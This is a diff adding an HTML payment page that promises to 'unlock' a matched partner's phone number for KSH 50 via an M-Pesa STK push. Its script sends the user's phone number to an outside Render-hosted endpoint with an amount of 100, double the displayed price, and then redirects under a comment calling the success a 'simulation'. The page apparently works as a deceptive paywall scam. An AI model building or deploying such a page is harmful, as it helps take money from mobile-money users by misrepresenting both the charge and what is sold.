@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Access</title>
+    <style>
+        :root { --xv-orange: #ff9900; --dark-black: #0b141a; }
+        body { background: var(--dark-black); color: white; font-family: Arial; margin: 0; }
+        
+        /* Modal Style for Processing */
+        #processing-window {
+            display: none; positionh fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center;
+            flex-direction: column; text-align: center;
+        }
+        .spinner {
+            border: 8px solid #333; border-top: 8px solid var(--xv-orange);
+            border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .main-container { max-width: 600px; margin: auto; padding: 20px; text-align: center; }
+        .join-box { background: #1b1b1b; padding: 25px; border-radius: 12px; border: 1px solid #333; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; }
+        input { 
+            width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; 
+            background: #000; color: white; font-size: 16px; box-sizing: border-box; 
+        }
+        .error-alert { color: #f15c6d; font-size: 12px; margin-top: 5px; display: none; }
+        
+        button {
+            width: 100%; padding: 15px; background: #555; color: #888; border: none;
+            border-radius: 5px; font-weight: bold; cursor: not-allowed; transition: 0.3s;
+        }
+        button.active { background: var(--xv-orange); color: black; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div id="processing-window">
+    <div class="spinner"></div>
+    <h3 id="status-text" style="color: var(--xv-orange);">SENDING STK PUSH, PLEASE WAIT...</h3>
+</div>
+
+<div class="main-container">
+    <div class="join-box">
+        <h2 style="color: var(--xv-orange);">UNLOCK ACCESS (KSH 50)</h2>
+        <p style="font-size: 15px; color: #888;">You will receive an M-Pesa STK push to complete payment. After completing your payment your matched partner's phone number will automatically be unlocked.</p>
+
+        <div class="input-group">
+            <label>M-Pesa Name</label>
+            <input type="text" id="mpesa_name" placeholder="Name on M-Pesa">
+        </div>
+
+        <div class="input-group">
+            <label>M-Pesa Phone Number</label>
+            <input type="tel" id="phone_num" placeholder="07xxxxxxxx or 01xxxxxxxx">
+            <div id="phone-error" class="error-alert">Weka namba sahihi ya Kenya (07.. au 01..)</div>
+        </div>
+
+        <button id="pay-btn" disabled>PAY NOW</button>
+    </div>
+</div>
+
+<script>
+    const phoneInput = document.getElementById('phone_num');
+    const nameInput = document.getElementById('mpesa_name');
+    const payBtn = document.getElementById('pay-btn');
+    const phoneError = document.getElementById('phone-error');
+    const modal = document.getElementById('processing-window');
+    const statusText = document.getElementById('status-text');
+
+    // Validation Regex: 07 or 01 followed by 8 digits
+    const kenyaPhoneRegex = /^(07|01)\d{8}$/;
+
+    function validateForm() {
+        const isPhoneValid = kenyaPhoneRegex.test(phoneInput.value);
+        const isNameFilled = nameInput.value.trim().length > 0;
+
+        // Toggle Error Text
+        if (phoneInput.value.length > 0 && !isPhoneValid) {
+            phoneError.style.display = "block";
+        } else {
+            phoneError.style.display = "none";
+        }
+
+        // Enable/Disable Button
+        if (isPhoneValid && isNameFilled) {
+            payBtn.classList.add('active');
+            payBtn.disabled = false;
+        } else {
+            payBtn.classList.remove('active');
+            payBtn.disabled = true;
+        }
+    }
+
+    phoneInput.addEventListener('input', validateForm);
+    nameInput.addEventListener('input', validateForm);
+
+    payBtn.addEventListener('click', async () => {
+        modal.style.display = "flex";
+        
+        const payload = {
+            phone_number: phoneInput.value,
+            amount: 100
+        };
+
+        try {
+            const response = await fetch('https://stkpush111.onrender.com/pay', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                statusText.innerText = "STK PUSH SENT! ENTER YOUR MPESA PIN";
+                statusText.style.color = "#00ff00";
+                // Redirect after success simulation
+                setTimeout(() => { window.location.href = "success.html"; }, 5000);
+            } else {
+                throw new Error("System Busy. Jaribu tena baadae.");
+            }
+        } catch (error) {
+            statusText.innerText = "ERROR: " + error.message;
+            statusText.style.color = "#ff3b3b";
+            setTimeout(() => { modal.style.display = "none"; }, 3000);
+        }
+    });
+</script>
+
+</body>
+</html>
